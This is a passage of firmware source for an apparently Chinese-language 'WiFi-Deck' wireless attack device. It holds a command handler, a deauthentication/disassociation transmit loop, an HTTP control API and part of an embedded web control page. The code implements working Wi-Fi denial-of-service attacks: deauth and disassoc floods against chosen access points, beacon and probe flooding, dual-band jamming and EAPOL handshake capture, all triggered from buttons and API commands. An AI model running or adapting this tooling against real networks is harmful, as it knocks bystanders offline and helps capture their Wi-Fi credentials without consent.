    Serial.println("Flood & Jam: beacon_flood, probe_flood, signal_jam, deauth_sniff");
    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, sniff_time <ms> [mode], stop sniff, hop on/off, set ch <c>, clear_logs");
    Serial.println("Config & AP: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config, ap on/off");
    Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
    bleSendLog("Cmds: scan | results | info | help | tx_stats | reset_txstats | ap on/off | stop");
    bleSendLog("Atk: start deauther/disassoc <i,j|all> | single_ap <index> | random_attack | attack_time <ms> <spec> | beacon_flood | probe_flood | signal_jam | deauth_sniff");
    bleSendLog("Sniff/Cfg: start sniff | sniff <mode> | sniff_time <ms> [mode] | stop sniff | hop on/off | set ch <c> | clear_logs | set <k> <v> | reset_config");
    return true;
  }
  else {
    return failCmd(errOut, "Unknown command: " + command);
  }
}

void handleCommand(String command) {
  executeCommand(command, nullptr, false);
}

//==========================================================
// Attack Functions
//==========================================================
bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick) {
  if (!st.active) return false;
  if (frameBudgetPerTick == 0) frameBudgetPerTick = 8;

  auto abortNow = [&]() -> bool {
    if (shouldAbortCycle()) return true;
    if (sendDeauth && !attack_enabled) return true;
    if (!sendDeauth && sendDisassoc && !disassoc_enabled) return true;
    return false;
  };

  if (abortNow()) {
    st.reset();
    restoreDefaultChannelIfNeeded(false);
    if (USE_LED) digitalWrite(LED_B, LOW);
    return false;
  }

  unsigned long sentThisTick = 0;
  while (st.active && sentThisTick < frameBudgetPerTick) {
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    const WiFiScanResult &tgt = st.targets[st.targetIdx];
    if (st.frameIdx == 0) {
      if (wifi_set_channel(tgt.channel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(tgt.channel);
        Serial.println(") failed");
        st.targetIdx++;
        continue;
      }
      setCurrentChannelSafe((int)tgt.channel);
    }

    if (st.frameIdx >= num_send_frames) {
      st.frameIdx = 0;
      st.targetIdx++;
      continue;
    }

    if (abortNow()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃
    if (sendDeauth) {
      wifi_tx_deauth_frame(tgt.bssid, dst_mac, deauth_reasons[st.frameIdx % num_deauth_reasons]);
    }
    if (sendDisassoc) {
      wifi_tx_disassoc_frame(tgt.bssid, dst_mac, disassoc_reasons[st.frameIdx % num_disassoc_reasons]);
    }

    st.frameIdx++;
    sentThisTick++;

    bool hasMoreInTarget = (st.frameIdx < num_send_frames);
    if (!hasMoreInTarget) {
      st.frameIdx = 0;
      st.targetIdx++;
    }
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }
    if (sentThisTick < frameBudgetPerTick) {
      delay(1);
    }
  }
  return st.active;
}

void targetAttack() {
  std::vector<WiFiScanResult> targets;
  bool isTargetMode = false;
  if (lockScanMutex()) {
    isTargetMode = target_mode;
    if (isTargetMode) {
      targets = target_aps;
    }
    unlockScanMutex();
  }
  if (isTargetMode && !targets.empty() && attack_enabled) {
    deauthSlice.reset();
    deauthSlice.targets = targets;
    deauthSlice.active = true;
    if (USE_LED) digitalWrite(LED_B, HIGH);
    while (stepSlicedTxCycle(deauthSlice, true, true, 8)) {
      feedWatchdog();
    }
  }
}

//==========================================================
// Web Client Handler
//==========================================================
void handleWebClient() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (!apEnabled || sniffingNow) return;  // ap off 或抓包切出 SoftAP 期间不轮询已关闭的 WebServer
  if (!webServerRunning()) {
    // Self-heal WebServer / SoftAP if apEnabled=true outside active attacks/scans
    static unsigned long lastSelfHealMs = 0;
    static unsigned long lastApHealMs = 0;
    unsigned long nowMs = millis();
    if (nowMs - lastSelfHealMs >= 2000) {
      lastSelfHealMs = nowMs;
      if (wifi_is_up(RTW_AP_INTERFACE)) {
        softApActive = true;
        wlanRuntimeMode = WLAN_MODE_AP;
        if (startWebServer(1)) {
          Serial.println("[INFO] WebServer self-healed on port 80.");
        }
      } else if (!pendingApRestart && !scan_enabled &&
                 !attack_enabled && !disassoc_enabled &&
                 !beacon_flood_enabled && !probe_flood_enabled &&
                 !signal_jam_enabled &&
                 (nowMs - lastApHealMs >= 5000)) {
        lastApHealMs = nowMs;
        Serial.println("[WARN] SoftAP interface down while apEnabled=true; recovering...");
        startSoftAP();
      }
    }
    return;
  }

  int client = acceptWebClient();
  if (client < 0) return;

  const size_t MAX_HTTP_REQ_LEN = 4096;
  const unsigned long IDLE_FIRST_BYTE_MS = 250;
  const unsigned long HDR_READ_TIMEOUT_MS = 1000;
  const unsigned long BODY_READ_TIMEOUT_MS = 1200;

  // Direct lwIP non-blocking accept + bounded SO_RCVTIMEO=25ms recv into fixed buffer
  static char httpReqBuf[4098];
  size_t reqLen = 0;
  httpReqBuf[0] = '\0';

  unsigned long startMs = millis();
  int headerEnd = -1;
  int sepLen = 4;
  bool tooLarge = false;
  bool peerDead = false;

  auto findHeaderTerm = [&](size_t scanFrom) -> void {
    const char *crlf = strstr(httpReqBuf + scanFrom, "\r\n\r\n");
    const char *lflf = strstr(httpReqBuf + scanFrom, "\n\n");
    if (crlf && (!lflf || crlf < lflf)) {
      headerEnd = (int)(crlf - httpReqBuf);
      sepLen = 4;
    } else if (lflf) {
      headerEnd = (int)(lflf - httpReqBuf);
      sepLen = 2;
    }
  };

  while (!peerDead && (millis() - startMs < HDR_READ_TIMEOUT_MS)) {
    feedWatchdog();
    if (reqLen == 0 && (millis() - startMs >= IDLE_FIRST_BYTE_MS)) {
      break;
    }
    size_t remainCap = (MAX_HTTP_REQ_LEN + 1) - reqLen;
    if (remainCap == 0) {
      tooLarge = true;
      break;
    }
    size_t readWant = (remainCap > 512) ? 512 : remainCap;
    int n = webClientRecv(client, (uint8_t *)(httpReqBuf + reqLen), readWant, peerDead);
    if (n > 0) {
      size_t scanFrom = (reqLen > 4) ? (reqLen - 4) : 0;
      reqLen += (size_t)n;
      httpReqBuf[reqLen] = '\0';
      if (reqLen > MAX_HTTP_REQ_LEN) {
        tooLarge = true;
        break;
      }
      findHeaderTerm(scanFrom);
      if (headerEnd >= 0) break;
    }
  }

  if (reqLen == 0 && headerEnd < 0 && !tooLarge) {
    closeWebClient(client, false);
    return;
  }

  if (tooLarge) {
    static const char ERR_413[] = "{\"status\":\"error\",\"message\":\"Request entity too large\"}";
    bool sentOk = sendHttpResponse(client, 413, "application/json", ERR_413, sizeof(ERR_413) - 1);
    closeWebClient(client, sentOk);
    return;
  }

  if (reqLen == 0 || headerEnd < 0) {
    static const char ERR_400_TIMEOUT[] = "{\"status\":\"error\",\"message\":\"Malformed or timed-out HTTP request\"}";
    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_TIMEOUT, sizeof(ERR_400_TIMEOUT) - 1);
    closeWebClient(client, sentOk);
    return;
  }

  char savedSep = httpReqBuf[headerEnd];
  httpReqBuf[headerEnd] = '\0';
  String headers(httpReqBuf);
  httpReqBuf[headerEnd] = savedSep;

  String method = parseMethod(headers);
  String fullPath = parsePath(headers);
  if (method.length() == 0) {
    static const char ERR_400_REQ[] = "{\"status\":\"error\",\"message\":\"Invalid HTTP request line\"}";
    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_REQ, sizeof(ERR_400_REQ) - 1);
    closeWebClient(client, sentOk);
    return;
  }

  long contentLength = 0;
  int clStatus = parseContentLengthHeader(headers, contentLength);
  if (clStatus < 0) {
    static const char ERR_400_CL[] = "{\"status\":\"error\",\"message\":\"Invalid Content-Length header\"}";
    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_CL, sizeof(ERR_400_CL) - 1);
    closeWebClient(client, sentOk);
    return;
  }
  if ((size_t)contentLength > MAX_HTTP_REQ_LEN ||
      ((size_t)headerEnd + (size_t)sepLen + (size_t)contentLength) > MAX_HTTP_REQ_LEN) {
    static const char ERR_413_LIMIT[] = "{\"status\":\"error\",\"message\":\"Payload exceeds limit\"}";
    bool sentOk = sendHttpResponse(client, 413, "application/json", ERR_413_LIMIT, sizeof(ERR_413_LIMIT) - 1);
    closeWebClient(client, sentOk);
    return;
  }

  size_t bodyStart = (size_t)headerEnd + (size_t)sepLen;
  size_t targetTotalLen = bodyStart + (size_t)contentLength;
  if (contentLength > 0 && reqLen < targetTotalLen) {
    unsigned long bodyWaitStart = millis();
    bool bodyPeerDead = false;
    while (reqLen < targetTotalLen &&
           !bodyPeerDead &&
           (millis() - bodyWaitStart < BODY_READ_TIMEOUT_MS)) {
      feedWatchdog();
      size_t need = targetTotalLen - reqLen;
      int n = webClientRecv(client, (uint8_t *)(httpReqBuf + reqLen), need, bodyPeerDead);
      if (n > 0) {
        reqLen += (size_t)n;
        httpReqBuf[reqLen] = '\0';
      }
    }
    if (reqLen < targetTotalLen) {
      static const char ERR_408[] = "{\"status\":\"error\",\"message\":\"Incomplete request body\"}";
      bool sentOk = sendHttpResponse(client, 408, "application/json", ERR_408, sizeof(ERR_408) - 1);
      closeWebClient(client, sentOk);
      return;
    }
  }

  String body;
  if (contentLength > 0) {
    char savedEnd = httpReqBuf[targetTotalLen];
    httpReqBuf[targetTotalLen] = '\0';
    body = (httpReqBuf + bodyStart);
    httpReqBuf[targetTotalLen] = savedEnd;
  } else if (reqLen > bodyStart) {
    body = (httpReqBuf + bodyStart);
  }

  int qIdx = fullPath.indexOf('?');
  String path = (qIdx >= 0) ? fullPath.substring(0, qIdx) : fullPath;
  String queryStr = (qIdx >= 0) ? fullPath.substring(qIdx + 1) : "";

  Serial.print("[WEB] ");
  Serial.print(method);
  Serial.print(" ");
  Serial.println(fullPath);

  if (USE_LED) digitalWrite(LED_G, HIGH);
  bool clientClosed = false;
  static const char ERR_405[] = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";

  if (path == "/api/scan") {
    if (method == "GET") {
      String json = getScanResultsJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else if (method == "POST") {
      String errMsg;
      if (executeCommand("scan", &errMsg, true)) {
        char resp[64];
        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"scan_complete\",\"count\":%lu}",
                          (unsigned long)getScanCountSafe());
        sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
      } else {
        char escErr[192], resp[256];
        jsonEscapeToBuf(errMsg.length() ? errMsg.c_str() : "Wi-Fi scan failed", escErr, sizeof(escErr));
        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
        sendHttpResponse(client, 500, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
      }
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else if (path == "/api/status") {
    if (method == "GET") {
      String json = getStatusJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else if (path == "/api/info") {
    if (method == "GET") {
      String json = getInfoJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else if (path == "/api/logs") {
    if (method == "GET") {
      String json = getLogsJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else if (path == "/api/logs/clear") {
    if (method == "POST") {
      String errMsg;
      executeCommand("clear_logs", &errMsg, true);
      static const char OK_JSON[] = "{\"status\":\"ok\"}";
      sendHttpResponse(client, 200, "application/json", OK_JSON, sizeof(OK_JSON) - 1);
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else if (path == "/api/command") {
    if (method != "POST") {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    } else {
      String cmd = hasFormKey(body, "cmd") ? getPostValue(body, "cmd") : getQueryParam(fullPath, "cmd");
      cmd.trim();
      if (cmd.length() == 0) {
        static const char ERR_EMPTY_CMD[] = "{\"status\":\"error\",\"message\":\"No command provided\"}";
        sendHttpResponse(client, 400, "application/json", ERR_EMPTY_CMD, sizeof(ERR_EMPTY_CMD) - 1);
      } else if (cmd.equalsIgnoreCase("ap off")) {
        // 决策 B：禁止通过 WebUI/HTTP 永久关闭 SoftAP
        static const char ERR_AP_OFF[] = "{\"status\":\"error\",\"message\":\"'ap off' is disabled over WebUI/HTTP; use BLE or Serial.\"}";
        sendHttpResponse(client, 403, "application/json", ERR_AP_OFF, sizeof(ERR_AP_OFF) - 1);
      } else {
        if (isStopCmdCstr(cmd.c_str())) {
          rtw_enter_critical(NULL, NULL);
          emergencyStopRequested = true;
          priorityStopPending = true;
          rtw_exit_critical(NULL, NULL);
        }
        bool entersPromisc = (cmd.equalsIgnoreCase("start sniff") ||
                              cmd.equalsIgnoreCase("sniff all") ||
                              cmd.equalsIgnoreCase("sniff beacon") ||
                              cmd.equalsIgnoreCase("sniff probe") ||
                              cmd.equalsIgnoreCase("sniff deauth") ||
                              cmd.equalsIgnoreCase("sniff eapol") ||
                              cmd.equalsIgnoreCase("sniff pwnagotchi") ||
                              startsWithIgnoreCase(cmd, "sniff_time ") ||
                              cmd.equalsIgnoreCase("deauth_sniff") ||
                              cmd.equalsIgnoreCase("deauth sniff"));
        if (entersPromisc) {
          String errMsg;
          bool preValid = true;
          if (startsWithIgnoreCase(cmd, "sniff_time ")) {
            unsigned long dummyDur = 0;
            SniffMode dummyMode = SNIFF_ALL;
            preValid = parseSniffTimeCmd(cmd, dummyDur, dummyMode, errMsg);
          }
          if (!preValid) {
            char escErr[192], resp[256];
            jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
            sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
          } else {
            // 先完整发送 HTTP 200 并等待刷出与单次关闭连接，再切入混杂/STA 模式
            char escCmd[192], resp[256];
            jsonEscapeToBuf(cmd.c_str(), escCmd, sizeof(escCmd));
            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"ok\",\"command\":\"%s\"}", escCmd);
            bool sentOk = sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
            closeWebClient(client, sentOk);
            delay(35);
            clientClosed = true;
            executeCommand(cmd, &errMsg, true);
            // If no BLE client is connected, protect pure-WebUI users with an automatic 15s recovery timer
            bool sniffStarted = false;
            rtw_enter_critical(NULL, NULL);
            sniffStarted = isSniffing;
            rtw_exit_critical(NULL, NULL);
            if (sniffStarted && !isBleConnectedSafe() && !timedSniffEnabled) {
              timedSniffEnabled = true;
              sniffStartTime = millis();
              sniffDuration = 15000;
            }
          }
        } else {
          String errMsg;
          if (executeCommand(cmd, &errMsg, true)) {
            char escCmd[192], resp[256];
            jsonEscapeToBuf(cmd.c_str(), escCmd, sizeof(escCmd));
            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"ok\",\"command\":\"%s\"}", escCmd);
            sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
          } else {
            int statusCode = (cmd.equalsIgnoreCase("scan")) ? 500 : 400;
            char escErr[192], resp[256];
            jsonEscapeToBuf(errMsg.length() ? errMsg.c_str() : "Command failed", escErr, sizeof(escErr));
            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
            sendHttpResponse(client, statusCode, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
          }
        }
      }
    }
  }
  else if (path == "/api/target") {
    if (method != "POST") {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    } else {
      bool hasIndices = hasFormKey(body, "indices") || hasFormKey(queryStr, "indices");
      if (!hasIndices) {
        static const char ERR_IDX[] = "{\"status\":\"error\",\"message\":\"Missing 'indices' parameter\"}";
        sendHttpResponse(client, 400, "application/json", ERR_IDX, sizeof(ERR_IDX) - 1);
      } else {
        String indices = hasFormKey(body, "indices") ? getPostValue(body, "indices") : getQueryParam(fullPath, "indices");
        indices.trim();
        String errMsg;
        bool ok = applyTargetSpec(indices, true, errMsg);
        size_t scanCount = 0;
        size_t targetCount = 0;
        bool targetModeSnap = false;
        getScanAndTargetCountsSafe(scanCount, targetCount, targetModeSnap);
        if (!ok) {
          char escErr[192], resp[280];
          jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
          int rn = snprintf(resp, sizeof(resp),
                            "{\"status\":\"error\",\"message\":\"%s\",\"targets\":%lu,\"target_mode\":%s}",
                            escErr, (unsigned long)targetCount, targetModeSnap ? "true" : "false");
          sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
        } else {
          blePushStatus();
          char resp[96];
          int rn = snprintf(resp, sizeof(resp),
                            "{\"status\":\"ok\",\"targets\":%lu,\"target_mode\":%s}",
                            (unsigned long)targetCount, targetModeSnap ? "true" : "false");
          sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
        }
      }
    }
  }
  else if (path == "/api/config") {
    if (method != "POST") {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    } else {
      static const char* const cfgKeys[] = {
        "ap_ssid", "ap_pass", "ble_name", "cycle_delay", "scan_time",
        "num_frames", "start_channel", "led", "scan_cycles"
      };
      const size_t numCfgKeys = sizeof(cfgKeys) / sizeof(cfgKeys[0]);
      String errMsg = "";
      bool valid = true;
      bool hasAnyKey = false;
      for (size_t k = 0; k < numCfgKeys; k++) {
        String key = cfgKeys[k];
        if (!hasFormKey(body, key)) continue;
        hasAnyKey = true;
        String val = getPostValue(body, key);
        val.trim();
        if (!validateConfigSetting(key, val, errMsg)) {
          valid = false;
          break;
        }
      }
      if (!hasAnyKey) {
        static const char ERR_NO_CFG[] = "{\"status\":\"error\",\"message\":\"No valid configuration parameters provided\"}";
        sendHttpResponse(client, 400, "application/json", ERR_NO_CFG, sizeof(ERR_NO_CFG) - 1);
      } else if (!valid) {
        char escErr[192], resp[256];
        jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
        sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
      } else {
        String result = "";
        bool apChanged = false;
        bool anyUpdated = false;
        for (size_t k = 0; k < numCfgKeys; k++) {
          String key = cfgKeys[k];
          if (!hasFormKey(body, key)) continue;
          String val = getPostValue(body, key);
          val.trim();
          if (applyConfigSetting(key, val, apChanged)) {
            anyUpdated = true;
            result += key + " updated ";
          }
        }
        if (anyUpdated) {
          saveConfigToFlash();
          blePushInfo();
          if (apChanged) {
            scheduleApRestart();
          }
        }
        char escRes[192], resp[280];
        jsonEscapeToBuf(result.c_str(), escRes, sizeof(escRes));
        int rn = snprintf(resp, sizeof(resp),
                          "{\"status\":\"ok\",\"ap_restarted\":%s,\"message\":\"%s\"}",
                          pendingApRestart ? "true" : "false", escRes);
        sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
      }
    }
  }
  else if (path == "/") {
    if (method == "GET") {
      sendHttpResponse(client, 200, "text/html", INDEX_HTML, strlen(INDEX_HTML));
    } else {
      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
    }
  }
  else {
    static const char ERR_404[] = "404 Not Found";
    sendHttpResponse(client, 404, "text/plain", ERR_404, sizeof(ERR_404) - 1);
  }

  if (!clientClosed) {
    closeWebClient(client, true);
  }
  if (USE_LED) digitalWrite(LED_G, LOW);
}

//==========================================================
// HTML Page (Mobile-friendly Web UI)
//==========================================================
const char INDEX_HTML[] = R"=====(<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0d1117">
<title>WiFi-Deck</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#f0f6fc;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding-bottom:60px}
.header{background:#161b22;padding:10px 14px;position:sticky;top:0;z-index:100;border-bottom:1px solid #2b323c}
.header-top{display:flex;justify-content:space-between;align-items:center}
.header h1{font-size:17px;font-weight:700;display:flex;align-items:center;gap:6px}
.badge{font-size:10px;padding:2px 6px;border-radius:4px;background:#102828;color:#39c5bb;border:1px solid rgba(57,197,187,.4)}
.status-dot{width:10px;height:10px;border-radius:50%;background:#3fb950;transition:.3s}
.status-dot.active{background:#8957e5;box-shadow:0 0 8px #8957e5}
.status-dot.attacking{background:#e94560;box-shadow:0 0 8px #e94560;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.telemetry{display:flex;justify-content:space-between;margin-top:8px;padding-top:6px;border-top:1px solid #21262d;font-family:monospace;font-size:11px;color:#8b949e}
.telemetry b{color:#f0f6fc}
.tabs{display:flex;background:#161b22;border-bottom:1px solid #2b323c;position:sticky;top:59px;z-index:99}
.tab{flex:1;padding:11px 0;text-align:center;font-size:12px;font-weight:600;color:#8b949e;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:#e94560;border-color:#e94560;background:#1a1f29}
.page{display:none;padding:12px}
.page.active{display:block}
.row{display:flex;gap:8px;align-items:center;margin:6px 0}
.chips{display:flex;gap:6px;overflow-x:auto;padding:4px 0;scrollbar-width:none}
.chip{white-space:nowrap;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;background:#161b22;color:#8b949e;border:1px solid #2b323c;cursor:pointer}
.chip.active{background:#2d161e;color:#e94560;border-color:#e94560}
.search-box{flex:1;padding:8px 10px;background:#161b22;border:1px solid #2b323c;border-radius:8px;color:#f0f6fc;font-size:12px}
.btn{display:inline-block;width:100%;padding:11px;margin:4px 0;border:1px solid transparent;border-radius:8px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;transition:.15s}
.btn:active{transform:scale(.98)}
.btn-primary{background:#e94560;color:#fff}
.btn-success{background:#2ea043;color:#fff}
.btn-warning{background:#d29922;color:#000}
.btn-info{background:#2f81f7;color:#fff}
.btn-dark{background:#161b22;color:#f0f6fc;border-color:#2b323c}
.btn.running,.btn-dark.running{background:#12261a;color:#3fb950;border-color:#3fb950}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:6px 0}
.net-item{background:#161b22;border-radius:9px;padding:10px 12px;margin:6px 0;display:flex;align-items:center;cursor:pointer;border:1px solid #2b323c;transition:.15s}
.net-item.selected{border-color:#e94560;background:#2d161e}
.net-info{flex:1;min-width:0}
.net-ssid{font-size:13px;font-weight:600;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.net-meta{font-size:11px;color:#8b949e;font-family:monospace}
.net-band{font-size:10px;padding:1px 5px;border-radius:4px;margin-left:5px;font-weight:700}
.net-band.band5{background:#231934;color:#8957e5;border:1px solid rgba(137,87,229,.5)}
.net-band.band24{background:#14233a;color:#2f81f7;border:1px solid rgba(47,129,247,.5)}
.net-check{width:22px;height:22px;border:1.5px solid #6e7681;border-radius:6px;display:flex;align-items:center;justify-content:center;margin-left:10px}
.net-item.selected .net-check{background:#e94560;border-color:#e94560}
.net-item.selected .net-check::after{content:'✓';color:#fff;font-size:13px}
.bar{width:100%;height:5px;background:#21262d;border-radius:3px;overflow:hidden;margin-top:5px}
.bar-fill{height:100%;border-radius:3px}
.bar-fill.good{background:#3fb950}
.bar-fill.mid{background:#d29922}
.bar-fill.bad{background:#e94560}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:6px 0}
.stat-card{background:#161b22;border:1px solid #2b323c;border-radius:8px;padding:8px;text-align:center}
.stat-val{font-size:17px;font-weight:700;color:#e94560;font-family:monospace}
.stat-label{font-size:10px;color:#8b949e;margin-top:2px}
.term{background:#090c10;border:1px solid #2b323c;border-radius:8px;padding:8px;height:260px;overflow-y:auto;font-family:monospace;font-size:11px;line-height:1.45;color:#c9d1d9}
.log-line{padding:2px 4px;border-bottom:1px solid #161b22;word-break:break-all}
.log-eapol{color:#d29922;background:rgba(210,153,34,.12)}
.log-deauth{color:#e94560;background:rgba(233,69,96,.12)}
.config-row{display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:#161b22;border:1px solid #2b323c;border-radius:8px;margin:5px 0}
.config-label{font-size:12px;color:#c9d1d9}
.config-input{width:130px;padding:6px 8px;background:#0d1117;border:1px solid #2b323c;border-radius:6px;color:#fff;font-size:12px;text-align:right;font-family:monospace}
.loading{display:none;text-align:center;padding:16px;color:#8b949e;font-size:12px}
.loading.show{display:block}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2631;color:#f0f6fc;padding:8px 16px;border-radius:20px;font-size:12px;z-index:200;opacity:0;transition:.25s;pointer-events:none;border:1px solid #e94560}
.toast.show{opacity:1}
.modal-mask{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:300;align-items:center;justify-content:center;padding:16px}
.modal-mask.show{display:flex}
.modal-card{background:#161b22;border:1px solid #2b323c;border-radius:12px;max-width:360px;width:100%;padding:16px}
.modal-title{font-size:15px;font-weight:700;margin-bottom:8px;color:#f0f6fc}
.modal-body{font-size:12px;line-height:1.55;color:#c9d1d9;margin-bottom:14px}
.banner{display:none;background:#1d192b;border:1px solid #8957e5;border-radius:8px;padding:8px 10px;margin:6px 0;font-size:12px;color:#e6edf3}
.banner.show{display:block}
.footer{text-align:center;padding:12px 8px;font-size:11px;color:#6e7681}
</style>
</head>
<body>
<div class="header">
  <div class="header-top">
    <h1>⚡ <span id="hdrName">WiFi-Deck</span> <span class="badge">2.4G / 5G</span></h1>
    <div class="status-dot" id="statusDot"></div>
  </div>
  <div class="telemetry">
    <span>CH: <b id="topCh">--</b></span>
    <span>APs: <b id="topAps">0</b></span>
    <span>目标: <b id="topTargets">0</b></span>
    <span>TX OK: <b id="topTxOk" style="color:#3fb950">0</b></span>
    <span>FAIL: <b id="topTxFail">0</b></span>
  </div>
</div>
<div class="tabs">
  <div class="tab active" onclick="showPage('scan')">📡 扫描</div>
  <div class="tab" onclick="showPage('attack')">⚔️ 控制</div>
  <div class="tab" onclick="showPage('sniff')">📟 抓包</div>
  <div class="tab" onclick="showPage('config')">⚙️ 设置</div>
</div>

<div class="page active" id="page-scan">
  <div class="row">
    <input class="search-box" id="searchBox" placeholder="搜索 SSID / BSSID..." oninput="renderNetworks()">
    <button class="btn btn-info" style="width:auto;padding:8px 14px;margin:0" onclick="doScan()">🔄 扫描双频</button>
  </div>
  <div class="chips">
    <div class="chip active" id="flt-all" onclick="setBand('ALL')">全部 (0)</div>
    <div class="chip" id="flt-24" onclick="setBand('2.4G')">2.4G (0)</div>
    <div class="chip" id="flt-5" onclick="setBand('5G')">5G (0)</div>
    <div class="chip active" id="srt-rssi" onclick="setSort('RSSI')">信号↓</div>
    <div class="chip" id="srt-ch" onclick="setSort('CH')">信道↑</div>
    <div class="chip" onclick="selectAllVisible()">全选</div>
    <div class="chip" onclick="clearSelection()">清空</div>
  </div>
  <div class="loading" id="scanLoading">正在扫描 2.4GHz & 5GHz 频段...</div>
  <div id="netList"></div>
</div>

<div class="page" id="page-attack">
  <div class="banner" id="timedBanner"></div>
  <div class="banner" id="atkReconnectBanner"></div>
  <div class="stats">
    <div class="stat-card"><div class="stat-val" id="statTargets">0</div><div class="stat-label">已选目标</div></div>
    <div class="stat-card"><div class="stat-val" id="statTxOk" style="color:#3fb950">0</div><div class="stat-label">TX 成功</div></div>
    <div class="stat-card"><div class="stat-val" id="statCh">--</div><div class="stat-label">当前信道</div></div>
  </div>
  <div class="grid2">
    <button class="btn btn-primary" id="btnDeauth" onclick="startAttack('start deauther')">▶️ Deauth 压制</button>
    <button class="btn btn-warning" id="btnDisassoc" onclick="startAttack('disassoc')">▶️ Disassoc 剥离</button>
    <button class="btn btn-dark" onclick="singleApAttack()">🎯 单目标点射</button>
    <button class="btn btn-dark" onclick="sendCmd('random_attack')">🎲 随机信道抽样</button>
  </div>
  <div class="grid2">
    <button class="btn btn-dark" id="btnBcn" onclick="sendCmd('beacon_flood')">📶 Beacon 伪热点</button>
    <button class="btn btn-dark" id="btnPrb" onclick="sendCmd('probe_flood')">📡 Probe 探测泛洪</button>
    <button class="btn btn-dark" id="btnJam" onclick="sendCmd('signal_jam')">📳 Signal Jam 双频</button>
    <button class="btn btn-dark" id="btnClone" onclick="startSniffClone()">🎯 Deauth 嗅探克隆</button>
  </div>
  <div class="row">
    <button class="btn btn-dark" onclick="timedAttackPreset(10000)">⏱️ 10s</button>
    <button class="btn btn-dark" onclick="timedAttackPreset(30000)">⏱️ 30s</button>
    <button class="btn btn-dark" onclick="timedAttackPreset(60000)">⏱️ 60s</button>
